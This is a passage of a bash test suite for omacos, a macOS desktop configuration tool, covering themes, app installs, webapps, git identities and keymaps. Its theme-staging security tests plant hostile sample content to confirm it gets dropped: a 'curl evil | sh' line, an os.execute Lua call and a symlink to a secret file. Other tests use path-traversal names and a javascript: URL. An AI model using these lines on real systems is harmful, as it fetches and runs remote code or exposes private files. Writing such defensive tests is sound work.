#!/usr/bin/env bash
# omacos test suite. Runs without touching the machine it runs on:
# HOME is redirected to a scratch dir, so nothing here can write to a real home.
set -uo pipefail

OMACOS_PATH="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
export OMACOS_PATH
export PATH="$OMACOS_PATH/bin:$PATH"

pass=0; fail=0
ok()   { pass=$((pass+1)); printf '  \033[32m✓\033[0m %s\n' "$1"; }
bad()  { fail=$((fail+1)); printf '  \033[31m✗\033[0m %s\n' "$1"; [[ -n ${2:-} ]] && printf '      %s\n' "$2"; }
check(){ if (set +o pipefail; eval "$2") >/dev/null 2>&1; then ok "$1"; else bad "$1" "failed: $2"; fi; }

sandbox=$(mktemp -d)
trap 'rm -rf "$sandbox"' EXIT
export HOME="$sandbox"
export XDG_CONFIG_HOME="$sandbox/.config"
export XDG_STATE_HOME="$sandbox/.local/state"
export OMACOS_CONFIG="$XDG_CONFIG_HOME/omacos"
export OMACOS_STATE="$XDG_STATE_HOME/omacos"
mkdir -p "$OMACOS_CONFIG" "$OMACOS_STATE"

# NO_WM is this machine with the desktop layer absent: omacos on PATH, no
# AeroSpace anywhere on it. Several checks need it, and it is also exactly what
# a machine that stopped at the terminal half looks like.
NO_WM="$OMACOS_PATH/bin:/usr/bin:/bin"

printf '\n\033[1mSyntax\033[0m\n'
for f in "$OMACOS_PATH"/bin/omacos*; do
  if bash -n "$f" 2>/dev/null; then :; else bad "parse $(basename "$f")"; fi
done
ok "all bin/ scripts parse"
check "shellcheck is clean" "shellcheck --severity=warning --shell=bash $OMACOS_PATH/bin/omacos*"

# Under `set -e`, a bare `cond && action` as the FINAL statement makes the
# script exit non-zero whenever cond is false — a success reported as failure.
# CI caught one of these; this catches the next one.
trailing_conditional() {
  local file last
  for file in "$OMACOS_PATH"/bin/omacos*; do
    last=$(grep -vE "^[[:space:]]*(#|$)" "$file" | tail -1)
    case $last in
      *"]] &&"*|*"] &&"*) echo "$(basename "$file"): $last"; return 0 ;;
    esac
  done
  return 1
}
check "no script ends in a bare conditional" "! trailing_conditional"

printf '\n\033[1mDispatcher\033[0m\n'
check "root help lists groups"        "omacos --help | grep -q theme"
# A group with no GROUP_DESCRIPTIONS entry still appears in the root help, just
# with nothing beside it — so adding a command in a new group silently ships a
# blank line of help unless someone notices.
check "every group is described"      "! omacos --help | grep -qE '^  [a-z-]+ +$'"
check "commands --json is valid JSON" "omacos commands --json | python3 -m json.tool"
check "unknown command exits 127"     "omacos definitely-not-a-command >/dev/null 2>&1; test \$? -eq 127"
check "group help works"              "omacos theme --help | grep -q 'Apply a theme'"

printf '\n\033[1mPrimitives\033[0m\n'
check "state set/check/clear" "omacos-state set t && omacos-state check t && omacos-state clear t && ! omacos-state check t"
check "state rejects traversal"   "! omacos-state set ../escape 2>/dev/null"
check "done ensure runs once"     "omacos-done ensure d && ! omacos-done ensure d"
check "feature defaults to off"   "! omacos-feature check desktop"
check "feature enable/disable"    "omacos-feature enable desktop && omacos-feature check desktop && omacos-feature disable desktop && ! omacos-feature check desktop"
check "feature rejects unknown"   "! omacos-feature enable bogus 2>/dev/null"

printf '\n\033[1mTheme engine\033[0m\n'
out="$sandbox/render"
check "renders templates"      "omacos-theme-render $OMACOS_PATH/themes/tokyo-night/colors.toml $out"
check "hex passthrough"        "grep -q 'BORDERS_ACTIVE_COLOR=0xff7aa2f7' $out/borders.sh"
check "strip modifier"         "grep -q 'background = 1a1b26' $out/ghostty.conf"
check "rgb modifier"           "grep -q '122,162,247' $out/macos.sh"
check "mix helper blends"      "grep -q 'minus-style = normal #4b2f3d' $out/delta.gitconfig"
check "every theme renders"    "for t in $OMACOS_PATH/themes/*/colors.toml; do omacos-theme-render \$t \$(mktemp -d) || exit 1; done"
# bat silently falls back to its default when handed a theme name it does not
# have, so a typo here is invisible until you notice bat looks wrong.
bat_themes_exist() {
  local known theme file
  known=$(bat --list-themes 2>/dev/null) || return 0   # no bat, nothing to check
  for file in "$OMACOS_PATH"/themes/*/colors.toml; do
    theme=$(sed -n 's/^bat_theme *= *"\(.*\)"/\1/p' "$file")
    [[ -n $theme ]] || { echo "$file has no bat_theme"; return 1; }
    [[ $'\n'$known$'\n' == *$'\n'"$theme"$'\n'* ]] || { echo "$file: bat has no theme '\''$theme'\''"; return 1; }
  done
  return 0
}
check "every bat_theme exists"  bat_themes_exist
check "no unresolved braces"   "! grep -rq '{{' $out"

printf '\n\033[1mTheme staging security\033[0m\n'
evil="$OMACOS_CONFIG/themes/evil"
mkdir -p "$evil/.git"
cp "$OMACOS_PATH/themes/tokyo-night/colors.toml" "$evil/colors.toml"
echo 'curl evil | sh' > "$evil/sketchybar.sh"
echo 'os.execute("evil")' > "$evil/nvim.lua"
printf 'SECRET\n' > "$sandbox/secret"
ln -sfn "$sandbox/secret" "$evil/preview.png"
omacos-theme-set evil >/dev/null 2>&1
staged="$OMACOS_STATE/current/theme"
check "untrusted executable dropped"  "! grep -rq 'curl evil' $staged"
check "untrusted lua dropped"         "! grep -rq 'os.execute' $staged"
check "symlink not followed"          "! test -e $staged/preview.png"
check "colours still applied"         "grep -q '0xff7aa2f7' $staged/borders.sh"

printf '\n\033[1mWallpaper\033[0m\n'
export OMACOS_DRY_RUN=1
check "generator produces a PNG" "omacos-dev-make-wallpaper tokyo-night >/dev/null && file $OMACOS_PATH/themes/tokyo-night/backgrounds/01-gradient.png | grep -q PNG"
for _ in 1 2 3; do omacos-theme-set tokyo-night >/dev/null 2>&1; done
omacos-theme-set catppuccin-mocha >/dev/null 2>&1
omacos-theme-set tokyo-night >/dev/null 2>&1
# Staging re-copies the image each switch, so an mtime-based fingerprint would
# leak one cache entry per switch. Content hashing keeps it at one per theme.
check "cache holds one file per theme" "test \$(ls -1 $OMACOS_STATE/wallpapers | wc -l) -eq 2"
check "background symlink resolves"    "test -f \$(readlink $OMACOS_STATE/current/background)"
unset OMACOS_DRY_RUN

printf '\n\033[1mSeeding\033[0m\n'
# The guarantee the whole design rests on: a file you have edited is never
# rewritten, while a file that does not exist yet still arrives.
seed_dir="$XDG_CONFIG_HOME"
mkdir -p "$seed_dir/zsh"
printf 'MINE\n' > "$seed_dir/zsh/.zshrc"
rm -rf "$seed_dir/omacos/hooks"
seed_one() {
  while IFS= read -r -d '' src; do
    rel=${src#"$OMACOS_PATH"/config/}
    dst="$seed_dir/$rel"
    [[ -e $dst ]] && continue
    mkdir -p "$(dirname "$dst")"; cp "$src" "$dst"
  done < <(find "$OMACOS_PATH/config" -type f -print0)
}
seed_one
check "existing file left alone"   "test \"\$(cat $seed_dir/zsh/.zshrc)\" = MINE"
check "missing file gets seeded"   "test -f $seed_dir/omacos/hooks/theme-set.d/notify.sample"
check "refresh takes the new default" "omacos-refresh-config zsh/.zshrc >/dev/null && grep -q OMACOS_PATH $seed_dir/zsh/.zshrc"
check "refresh keeps a backup"     "ls $seed_dir/zsh/.zshrc.bak.* >/dev/null"
# An activated hook runs; the shipped .sample beside it must not.
hook_dir="$seed_dir/omacos/hooks/theme-set.d"
printf '#!/usr/bin/env bash\necho ACTIVE >> "$HOME/hook-ran"\n' > "$hook_dir/active"
printf '#!/usr/bin/env bash\necho SAMPLE >> "$HOME/hook-ran"\n' > "$hook_dir/inert.sample"
chmod +x "$hook_dir/active" "$hook_dir/inert.sample"
omacos-hook theme-set test >/dev/null 2>&1
check "activated hook runs"        "grep -q ACTIVE $HOME/hook-ran"
check "shipped .sample stays inert" "! grep -q SAMPLE $HOME/hook-ran"

printf '\n\033[1mGit identities\033[0m\n'
export HOME="$sandbox"
git config --global user.name "Default" >/dev/null 2>&1
git config --global user.email "default@example.com" >/dev/null 2>&1
mkdir -p "$sandbox/Work"
printf 'WORK_DIR=%q\n' "$sandbox/Work" > "$OMACOS_CONFIG/local.env"

check "org add writes a config" "omacos-git-org-add Acme --name A --email a@acme.com >/dev/null && test -f $XDG_CONFIG_HOME/git/orgs/Acme"
check "org add registers includeIf" "git config --global --get-regexp '^includeif' | grep -q Acme"
# macOS filesystems are case-insensitive by default, so a case-sensitive
# gitdir would silently miss ~/work/acme.
check "includeIf is case-insensitive" "git config --global --get-regexp '^includeif' | grep -q 'gitdir/i:'"
mkdir -p "$sandbox/Work/Acme/repo" "$sandbox/elsewhere"
git -C "$sandbox/Work/Acme/repo" init -q
git -C "$sandbox/elsewhere" init -q
check "identity applies inside the org"  "test \"\$(git -C $sandbox/Work/Acme/repo config user.email)\" = a@acme.com"
check "identity does not leak outside"   "test \"\$(git -C $sandbox/elsewhere config user.email)\" = default@example.com"
check "org list shows it"                "omacos-git-org-list | grep -q Acme"
check "org remove unregisters it"        "omacos-git-org-remove Acme >/dev/null && ! git config --global --get-regexp '^includeif' | grep -q Acme"
check "org remove keeps your directory"  "test -d $sandbox/Work/Acme"
check "org name rejects traversal"       "! omacos-git-org-add ../evil --name A --email a@b.c 2>/dev/null"

printf '\n\033[1mMigrations\033[0m\n'
check "runner is idempotent" "omacos-migrate >/dev/null && omacos-migrate 2>&1 | grep -q 'No pending'"
check "--pending is a predicate" "! omacos-migrate --pending >/dev/null"

printf '\n\033[1mMenu\033[0m\n'
check "root route lists rows" "omacos-menu --list | grep -q style"
check "nested route resolves" "omacos-menu --list style | grep -q style.theme"
check "shipped menu is valid JSON" "python3 -m json.tool < $OMACOS_PATH/default/menu.json"

# Shared fakes. `open` echoes rather than exiting silently: several checks
# below are about which URL a command would have opened, and that is the only
# place it shows.
shim="$sandbox/shim"; mkdir -p "$shim"
printf '#!/usr/bin/env bash\nexit 0\n' > "$shim/osascript"
printf '#!/usr/bin/env bash\necho "open $*"\n' > "$shim/open"
chmod +x "$shim/osascript" "$shim/open"

printf '\n\033[1mApp catalog\033[0m\n'
check "shipped catalog is valid JSON" "python3 -m json.tool < $OMACOS_PATH/default/apps.json"
# Every consumer reads these fields, so a missing one is a runtime failure in
# the menu rather than anything the JSON parse would catch.
catalog_entries_complete() {
  python3 - "$OMACOS_PATH/default/apps.json" <<'PYCHK'
import json, sys
apps = json.load(open(sys.argv[1]))
sources = {"cask", "formula", "mas", "mise", "webapp", "tui"}
for key, entry in apps.items():
    for field in ("icon", "label", "category", "source"):
        assert entry.get(field), f"{key}: missing {field}"
    assert entry["source"] in sources, f"{key}: unknown source {entry['source']}"
    assert key.split(".")[0] == entry["category"], f"{key}: id prefix is not its category"
    if entry["source"] == "webapp":
        assert entry.get("url"), f"{key}: a webapp needs a url"
    elif entry["source"] == "tui":
        assert entry.get("command") and entry.get("window"), f"{key}: a tui needs command and window"
        assert entry["window"] in ("float", "tile"), f"{key}: window must be float or tile"
    else:
        assert entry.get("package"), f"{key}: needs a package"
PYCHK
}
check "every entry carries what its source needs" catalog_entries_complete
# A role that omacos-launch-app does not accept silently never resolves.
catalog_roles_exist() {
  local role
  for role in $(python3 -c "import json;print(' '.join({e['role'] for e in json.load(open('$OMACOS_PATH/default/apps.json')).values() if 'role' in e}))"); do
    # browser, terminal, editor and agent are defaults roles, each with its own
    # `omacos default <role>` command; everything else is an app role.
    case $role in
      browser|terminal|editor|agent)
        [[ -x $OMACOS_PATH/bin/omacos-default-$role ]] || return 1 ;;
      *)
        grep -qE "^  $role\)" "$OMACOS_PATH/bin/omacos-launch-app" || return 1 ;;
    esac
  done
}
check "every catalog role is a real role" catalog_roles_exist
# Brewfile.apps bootstraps the `apps` feature; the catalog is the browsable
# superset. Nothing keeps them in step but this.
check "every bootstrap cask is in the catalog" "
  for c in \$(grep '^cask ' $OMACOS_PATH/Brewfile.apps | cut -d'\"' -f2); do
    grep -q \"\\\"package\\\": \\\"\$c\\\"\" $OMACOS_PATH/default/apps.json || exit 1
  done"
check "app list prints id, label and state" "omacos-app-list browser | grep -qE '^browser\.brave\tBrave\t(installed|available)$'"
check "app list --json is valid JSON"       "omacos-app-list browser --json | python3 -m json.tool"
check "app list rejects an unknown category" "! omacos-app-list nonsense >/dev/null 2>&1"
check "app present answers an unknown id with 2" \
  "omacos-app-present nope.nope >/dev/null 2>&1; test \$? -eq 2"

printf '\n\033[1mApp removal\033[0m\n'
# ~/Applications is your tree. What keeps omacos out of the apps you put there
# yourself is the marker in Info.plist, so that is what these check.
make_bundle() {
  local name=$1 identifier=$2
  mkdir -p "$HOME/Applications/$name.app/Contents/MacOS"
  cat > "$HOME/Applications/$name.app/Contents/Info.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleName</key><string>$name</string>
  <key>CFBundleIdentifier</key><string>$identifier</string>
</dict>
</plist>
PLIST
}
make_bundle Marked com.omacos.webapp.marked
make_bundle Theirs com.example.theirs
check "removes a bundle it made" \
  "omacos-remove-app Marked --yes >/dev/null && ! test -d $HOME/Applications/Marked.app"
check "refuses a bundle it did not make" \
  "! omacos-remove-app Theirs --yes >/dev/null 2>&1 && test -d $HOME/Applications/Theirs.app"
check "says why it refused"  "omacos-remove-app Theirs --yes 2>&1 | grep -q 'not created by omacos'"
check "refuses something it never installed" "! omacos-remove-app not-an-app --yes >/dev/null 2>&1"
# The App Store has no uninstall, and deleting the bundle by hand leaves its
# receipt behind — so this refuses rather than half-removing it.
# Only reachable once the entry looks installed, so stage one: a bundle by the
# name the catalog probes for, and a forced snapshot so it is seen.
mkdir -p "$HOME/Applications/Xcode.app/Contents"
omacos-app-present --refresh development.xcode >/dev/null 2>&1 || true
check "refuses an App Store entry" \
  "! omacos-remove-app development.xcode --yes >/dev/null 2>&1"
check "points at Finder instead" \
  "omacos-remove-app development.xcode --yes 2>&1 | grep -qi 'App Store'"
rm -rf "$HOME/Applications/Xcode.app"
check "remove feature leaves packages alone by default" \
  "omacos-feature enable apps && omacos-remove-feature apps 2>&1 | grep -q 'still installed'"
check "remove feature turns the flag off" "! omacos-feature check apps"

printf '\n\033[1mDefaults and roles\033[0m\n'
check "roles are listed in one place" "omacos-launch-app --roles | grep -qx music"
check "default app lists every role"  "omacos-default-app | grep -q '^music'"
check "default app rejects a bad role" "! omacos-default-app nonsense-role something 2>/dev/null"
check "default app records a choice" \
  "omacos-default-app music Spotify >/dev/null && grep -q '^MUSIC_APP=Spotify' $OMACOS_CONFIG/local.env"
check "default app reads it back"     "test \"\$(omacos-default-app music)\" = Spotify"
# This is the bug the upsert exists to fix: the old append left two lines and
# let the stale one win on the next read.
check "setting twice leaves one line" "
  omacos-default-app music Music >/dev/null
  test \$(grep -c '^MUSIC_APP=' $OMACOS_CONFIG/local.env) -eq 1"
check "an unset default stays silent" "test -z \"\$(omacos-default-editor)\""
check "a catalog label resolves to its app" "
  omacos-default-app notes Obsidian >/dev/null
  grep -q '^NOTES_APP=Obsidian' $OMACOS_CONFIG/local.env"
check "an unknown browser is refused"  "! omacos-default-browser not-a-browser 2>/dev/null"
check "the browser command names the choices" \
  "omacos-default-browser not-a-browser 2>&1 | grep -q firefox"
# The keymap must keep naming the job rather than the app, or local.env stops
# being the place that decides.
check "launch-app resolves an override" "
  env MUSIC_APP=Spotify PATH=$sandbox/shim:\$PATH omacos-launch-app music --has"

printf '\n\033[1mApp installs\033[0m\n'
# The install path extracts cask names from this file, so every `cask` line
# must yield one. Inline quoting for this is unreadable; use a function.
apps_brewfile_parses() {
  local lines names
  lines=$(grep -c '^cask ' "$OMACOS_PATH/Brewfile.apps")
  names=$(grep '^cask ' "$OMACOS_PATH/Brewfile.apps" | cut -d'"' -f2 | grep -c .)
  [[ $lines -gt 0 && $lines -eq $names ]]
}
check "apps Brewfile parses into cask names" apps_brewfile_parses
# Several casks ship a .pkg and run installer under sudo, which cannot prompt
# without a terminal. install-app must relaunch rather than fail obscurely.
check "install-app relaunches without a tty" \
  "grep -q 'omacos-launch-tui' $OMACOS_PATH/bin/omacos-install-app"
check "install-app reports failure"  "grep -q 'exit 1' $OMACOS_PATH/bin/omacos-install-app"
check "every feature flag is checked somewhere" "
  for f in \$(grep -oE 'KNOWN=\\(([a-z ]+)\\)' $OMACOS_PATH/bin/omacos-feature | tr -d 'KNOWN=()'); do
    grep -rqE \"feature check \$f|\\| *\$f\\)|^  \$f\\)\" $OMACOS_PATH/bin $OMACOS_PATH/install || exit 1
  done"

printf '\n\033[1mCaps Lock\033[0m\n'
check "uses hidutil, not a driver"  "grep -q 'hidutil' $OMACOS_PATH/bin/omacos-setup-capslock"
check "persists via a login agent"  "grep -q 'LaunchAgents' $OMACOS_PATH/bin/omacos-setup-capslock"
check "off is offered"              "omacos-setup-capslock 2>&1 | grep -qv Unknown"
check "rejects unknown targets"     "! omacos-setup-capslock nonsense 2>/dev/null"
# Under `set -o pipefail`, `producer | grep -q` reports failure whenever grep
# matches early: grep exits, the producer takes SIGPIPE, and the pipeline
# returns 141. It reads as a clean idiom and silently inverts the result.
pipes_into_grep_q() {
  grep -lE '^[^#]*[a-z] \| *grep -q' "$OMACOS_PATH"/bin/omacos* 2>/dev/null | head -1
}
check "nothing pipes into grep -q" "test -z \"\$(pipes_into_grep_q)\""
check "hyper explains the driver cost" "grep -q 'DriverKit' $OMACOS_PATH/bin/omacos-setup-capslock"

printf '\n\033[1mBrowser\033[0m\n'
# duti's role argument is for UTIs; passing it alongside a URL scheme makes
# duti invent a dynamic UTI and fail with error -50.
check "sets schemes without a role arg" \
  "! grep -E 'duti -s .* (http|https) (all|viewer|editor)' $OMACOS_PATH/bin/omacos-setup-browser"
check "uses duti, not defaultbrowser"  "grep -q 'duti -s' $OMACOS_PATH/bin/omacos-setup-browser && ! grep -q 'defaultbrowser ' $OMACOS_PATH/bin/omacos-setup-browser"
check "browser keybinding is not hard-coded" \
  "! grep -q 'Browser | exec-and-forget open -a' $OMACOS_PATH/config/omacos/keymap.conf"
check "apps Brewfile ships a browser"  "grep -q 'brave-browser' $OMACOS_PATH/Brewfile.apps"

printf '\n\033[1mWebapps\033[0m\n'
mkdir -p "$HOME/Applications"
check "creates an app bundle"      "omacos-webapp-install Demo https://example.com && test -x $HOME/Applications/Demo.app/Contents/MacOS/Demo"
check "Info.plist is valid"        "plutil -lint $HOME/Applications/Demo.app/Contents/Info.plist"
check "rejects path traversal"     "! omacos-webapp-install ../evil https://example.com 2>/dev/null"
check "rejects javascript: URLs"   "! omacos-webapp-install X 'javascript:alert(1)' 2>/dev/null"
check "removes what it created"    "omacos-webapp-remove Demo && ! test -d $HOME/Applications/Demo.app"
mkdir -p "$HOME/Applications/Foreign.app/Contents"
echo '<plist></plist>' > "$HOME/Applications/Foreign.app/Contents/Info.plist"
check "refuses foreign bundles"    "! omacos-webapp-remove Foreign 2>/dev/null && test -d $HOME/Applications/Foreign.app"
# A bare domain is what people type; the URL is also what `webapp list` reads
# back, so it has to be recorded, not just baked into the launcher.
check "normalises a bare domain"   "omacos-webapp-install Bare example.org && grep -q 'https://example.org' $HOME/Applications/Bare.app/Contents/Info.plist"
check "list round-trips the url"   "omacos-webapp-list | grep -qE '^Bare\thttps://example.org$'"
check "list --json is valid JSON"  "omacos-webapp-list --json | python3 -m json.tool"
check "list ignores foreign apps"  "! omacos-webapp-list | grep -q Foreign"
check "--all removes only ours"    "omacos-webapp-remove --all --yes >/dev/null && test -d $HOME/Applications/Foreign.app && ! test -d $HOME/Applications/Bare.app"

printf '\n\033[1mTerminal apps\033[0m\n'
check "creates a bundle"          "omacos-tui-install Demo lazydocker tile && test -x '$HOME/Applications/Demo.app/Contents/MacOS/Demo'"
check "Info.plist is valid"       "plutil -lint $HOME/Applications/Demo.app/Contents/Info.plist"
# Float and tile are decided by the window title alone — base.toml floats a
# Ghostty window whose title contains "omacos". Nothing else would catch this
# until a window tiled wrongly on someone's machine.
check "a tiling app avoids the float title" "! grep -q 'OMACOS_TUI_TITLE=omacos' $HOME/Applications/Demo.app/Contents/MacOS/Demo"
check "a floating app asks for it" "
  omacos-tui-install Floaty btop float >/dev/null
  grep -q 'OMACOS_TUI_TITLE=omacos' '$HOME/Applications/Floaty.app/Contents/MacOS/Floaty'"
check "the float rule still matches that title" \
  "grep -q \"window-title-regex-substring = 'omacos'\" $OMACOS_PATH/default/aerospace/base.toml"
check "rejects a bad window style" "! omacos-tui-install Bad cmd sideways 2>/dev/null"
check "rejects path traversal"     "! omacos-tui-install ../evil cmd tile 2>/dev/null"
check "will not remove a web app as a TUI" "
  omacos-webapp-install Mixed https://example.com >/dev/null
  ! omacos-tui-remove Mixed 2>/dev/null && test -d $HOME/Applications/Mixed.app"
check "removes what it created"    "omacos-tui-remove --all --yes >/dev/null && ! test -d $HOME/Applications/Demo.app"
omacos-webapp-remove --all --yes >/dev/null 2>&1 || true

printf '\n\033[1mPreinstalls\033[0m\n'
# The catalog is the only list, so the two commands cannot drift apart the way
# a hand-kept list in each of them would.
check "the preinstall set comes from the catalog" "
  grep -q 'preinstall' $OMACOS_PATH/bin/omacos-remove-preinstalls &&
  grep -q 'preinstall' $OMACOS_PATH/bin/omacos-install-preinstalls"
check "something is actually flagged" "grep -q '\"preinstall\": true' $OMACOS_PATH/default/apps.json"
# Real removal would reach the machine running the suite, so the remover is
# shimmed and only what it was asked to remove is checked.
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$@" >> "$HOME/removed.log"\n' > "$shim/omacos-remove-app"
chmod +x "$shim/omacos-remove-app"
omacos-webapp-install Doomed https://example.com >/dev/null 2>&1
omacos-tui-install Doomed2 btop float >/dev/null 2>&1
check "removal takes the web apps and TUIs with it" "
  env PATH=$shim:\$PATH omacos-remove-preinstalls --yes >/dev/null 2>&1
  ! test -d $HOME/Applications/Doomed.app && ! test -d $HOME/Applications/Doomed2.app"
check "it marks the machine as opted out" "omacos-state check preinstalls-removed"
check "it never removes something not flagged" "
  ! grep -q 'browser.firefox' $HOME/removed.log 2>/dev/null"
# The marker is what flips the two menu rows, in both directions.
check "restoring is offered once removed"  "omacos-menu --list install | grep -q install.preinstalls"
check "removing is not offered twice"      "! omacos-menu --list remove | grep -q remove.preinstalls"
omacos-state clear preinstalls-removed
check "removing is offered again once back" "omacos-menu --list remove | grep -q remove.preinstalls"
check "restoring is not offered when nothing was removed" "! omacos-menu --list install | grep -q install.preinstalls"
rm -f "$shim/omacos-remove-app" "$HOME/removed.log"

printf '\n\033[1mURL handlers\033[0m\n'
# macOS hands a URL to an app as an Apple Event, never as an argument, so these
# translations live in a script and an AppleScript applet calls it.
check "hey rewrites mailto"  "env PATH=$sandbox/shim:\$PATH omacos-webapp-handler-hey 'mailto:a@b.com' 2>&1 | grep -q 'messages/new?to=a@b.com'"
check "hey without a link"   "env PATH=$sandbox/shim:\$PATH omacos-webapp-handler-hey 2>&1 | grep -q 'app.hey.com'"
check "zoom joins a meeting" "env PATH=$sandbox/shim:\$PATH omacos-webapp-handler-zoom 'zoommtg://zoom.us/join?confno=123&pwd=xy' 2>&1 | grep -q 'wc/join/123?pwd=xy'"
check "zoom without a link"  "env PATH=$sandbox/shim:\$PATH omacos-webapp-handler-zoom 2>&1 | grep -q 'wc/home'"

printf '\n\033[1mMenu guards and providers\033[0m\n'
# A row that is already true stays listed and goes unselectable, so Install
# reads as what you have rather than shrinking as you use it.
check "a disabled row is ticked"     "omacos-menu --list install.browser | grep -q '✓'"
check "a disabled row has no action" "test -z \"\$(omacos-menu --list install.browser | awk -F'\t' '/✓/ {print \$3}')\""
check "a checked row keeps its action" "omacos-menu --list setup.defaults.browser | awk -F'\t' '/✓/ {exit (\$3 == \"\")}'"
check "provider rows reach --list"   "omacos-menu --list install.editor | grep -q install.editor.zed"
# A submenu's action column is empty; read it with IFS=tab and bash eats it,
# because a tab is IFS whitespace and runs of it collapse.
check "an empty action stays empty"  "test -z \"\$(omacos-menu --list | awk -F'\t' '\$1 == \"install\" {print \$3}')\""
check "every provider names a real command" "
  for provider in \$(jq -r '.[].provider // empty' $OMACOS_PATH/default/menu.json | awk '{print \$1}' | sort -u); do
    case \$provider in omacos-*) test -x $OMACOS_PATH/bin/\$provider || exit 1 ;; esac
  done"

printf '\n\033[1mKeymap\033[0m\n'
cp "$OMACOS_PATH/config/omacos/keymap.conf" "$OMACOS_CONFIG/keymap.conf"
check "builds aerospace.toml"  "omacos-keymap-build"
check "no duplicate bindings" "test -z \"\$(sed -n '/^\\[mode\\.main\\.binding\\]/,/^\\[/p' $XDG_CONFIG_HOME/aerospace/aerospace.toml | grep -E \"^[a-z0-9-]+ = '\" | cut -d' ' -f1 | sort | uniq -d)\""
check "parses as TOML"         "yq -p toml -o json '.' $XDG_CONFIG_HOME/aerospace/aerospace.toml"
# TOML binds a bare key to the table above it, so a top-level setting emitted
# after base.toml silently becomes a key of [[on-window-detected]].
check "top-level keys stay top-level" "yq -p toml -o json '.' $XDG_CONFIG_HOME/aerospace/aerospace.toml | python3 -c \"
import json,sys
d = json.load(sys.stdin)
assert 'persistent-workspaces' in d, 'persistent-workspaces is not top-level'
assert d.get('config-version') == 2, 'config-version missing or wrong'
for rule in d.get('on-window-detected', []):
    assert set(rule) <= {'if','run'}, f'stray key leaked into on-window-detected: {rule}'
\""
check "workspaces come from the keymap" "yq -p toml -o json '.' $XDG_CONFIG_HOME/aerospace/aerospace.toml | python3 -c \"
import json,sys
d = json.load(sys.stdin)
# Only bindings that name a literal workspace count. An action can also be a
# TOML array (a list of commands), and 'workspace --wrap-around next' names a
# direction rather than a workspace — neither should be mistaken for one.
bound = set()
for action in d['mode']['main']['binding'].values():
    if not isinstance(action, str) or not action.startswith('workspace '):
        continue
    # Flags are dropped, so 'workspace --auto-back-and-forth S' still names S,
    # which is what the generator's grep does too. 'next'.isalnum() is True, so
    # the directions have to be excluded by name rather than by shape.
    args = [a for a in action.split()[1:] if not a.startswith('--')]
    if len(args) == 1 and args[0].isalnum() and args[0] not in ('next', 'prev'):
        bound.add(args[0])
assert set(d['persistent-workspaces']) == bound, (d['persistent-workspaces'], bound)
\""
# AeroSpace refuses a config with one unknown key name, and refusing means
# keeping the config it already had — so a typo like `escape` for `esc` leaves
# every binding in the file inert while the build reports success. CI has no
# AeroSpace to ask, so the key vocabulary is checked here.
aerospace_key_names_valid() {
  local named="esc enter space backspace tab delete equal minus slash comma
               period semicolon quote backtick leftSquareBracket
               rightSquareBracket left down up right home end
               pageUp pageDown"
  local key last
  while IFS='|' read -r key _; do
    key=${key//[[:space:]]/}
    [[ -n $key && $key != \#* ]] || continue
    last=${key##*-}
    [[ $last =~ ^[a-z0-9]$ ]] && continue
    [[ $last =~ ^f[0-9]{1,2}$ ]] && continue
    [[ " ${named//[$'\n'] / } " == *" $last "* ]] && continue
    echo "unknown key name: $key"
    return 1
  done < <(grep -E '^[a-z].*\|.*\|' "$OMACOS_PATH/config/omacos/keymap.conf")
  return 0
}
check "key names are ones AeroSpace knows" aerospace_key_names_valid
check "build reports a rejected config"   "grep -q 'rejected the config' $OMACOS_PATH/bin/omacos-keymap-build"
array_action_survives() {
  local keymap="$OMACOS_CONFIG/keymap.conf" toml="$XDG_CONFIG_HOME/aerospace/aerospace.toml"
  printf "alt-cmd-comma | Stack with the window right | ['join-with right', 'layout accordion']\n" >> "$keymap"
  omacos-keymap-build >/dev/null 2>&1 || return 1
  # Emitted verbatim as a list, not wrapped in quotes and not de-quoted inside.
  grep -qF "alt-cmd-comma = ['join-with right', 'layout accordion']" "$toml" || return 1
  yq -p toml -o json '.' "$toml" | python3 -c "
import json,sys
v = json.load(sys.stdin)['mode']['main']['binding']['alt-cmd-comma']
assert isinstance(v, list), f'not a TOML array: {v!r}'
assert v == ['join-with right', 'layout accordion'], v
"
}
check "array actions stay arrays" array_action_survives
# A single quote in a non-array action cannot survive: the value is emitted
# inside single quotes, so the builder strips it — turning `-p '"'"'Press any key'"'"'`
# into three arguments. It is silent damage you only find by pressing the key.
quoted_action_is_flagged() {
  local keymap="$OMACOS_CONFIG/keymap.conf" output
  printf "alt-ctrl-shift-9 | Quoted | exec-and-forget echo '"'"'hello there'"'"'\n" >> "$keymap"
  output=$(omacos-keymap-build 2>&1)
  sed -i '"'"''"'"' '/^alt-ctrl-shift-9 /d' "$keymap"
  omacos-keymap-build >/dev/null 2>&1
  [[ $output == *"quotes in its action"* ]]
}
check "a quoted action is flagged" quoted_action_is_flagged
# And the shipped keymap must not contain one, or every build nags.
check "no shipped action is quoted" \
  "! awk -F'"'"'|'"'"' '/^[a-z]/ && \$3 !~ /^[[:space:]]*\\[/ && \$3 ~ /'"'"'/ {print; found=1} END {exit !found}' $OMACOS_PATH/config/omacos/keymap.conf"
check "cheatsheet renders"     "omacos-keymap-show --plain | grep -q 'Focus left'"
# A keymap comment that begins with a flag is prose, not a `# ---- rule ----`.
check "a flag in a comment is not a heading" \
  "! omacos-keymap-show --plain | grep -q 'Focus-follows-window'"
check "every binding documented" "test \$(grep -cE '^[a-z].*\\|.*\\|' $OMACOS_CONFIG/keymap.conf) -eq \$(omacos-keymap-show --plain | grep -cE '^  [a-z]')"

printf '\n\033[1mNavigation parity\033[0m\n'
# Omarchy's navigation chapter is the spec these answer to. Each check names
# the binding it mirrors, so a keymap edit that quietly drops one is loud.
KEYMAP="$OMACOS_PATH/config/omacos/keymap.conf"
BASE="$OMACOS_PATH/default/aerospace/base.toml"

# Super+Return then Super+Shift+Return — the chapter's first lesson.
check "alt-enter is a terminal"        "grep -q '^alt-enter | Terminal |' $KEYMAP"
check "alt-shift-enter is a browser"   "grep -q '^alt-shift-enter | Browser |' $KEYMAP"

# Super+Arrow. The arrows and hjkl have to stay the same four commands, or the
# cheatsheet promises two sets of keys that behave differently.
arrows_mirror_hjkl() {
  local pairs="h:left j:down k:up l:right" pair letter arrow vim arrowed
  for pair in $pairs; do
    letter=${pair%%:*}; arrow=${pair##*:}
